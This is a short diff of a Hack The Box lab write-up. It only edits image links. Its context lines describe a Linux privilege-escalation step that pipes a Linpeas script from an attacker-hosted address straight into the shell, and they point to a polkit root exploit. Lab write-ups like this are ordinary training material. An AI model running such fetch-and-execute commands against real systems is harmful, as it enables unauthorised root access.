@@ -5,7 +5,6 @@ tags:
   - hackthebox
   - linux
 ---
-![Image Description](/images/Pasted%20image%2020260116094520.png)
 <!--more-->
 ## Introduction
 
@@ -37,7 +36,7 @@ Based on that, we just need root's password and we are good to go.
 
 After running Linpeas with `curl -L http://10.10.17.8:5555/linpeas.sh | sh`, I found the following:
 
-!![Image Description](/images/Pasted%20image%2020260116155512.png)
+![Image Description](/images/Pasted%20image%2020260116155512.png)
 
 Looking up the CVE, I'm now reading [this article](https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/) which details how to exploit it. We'll give this a quick go, then look at all the password files after.
 
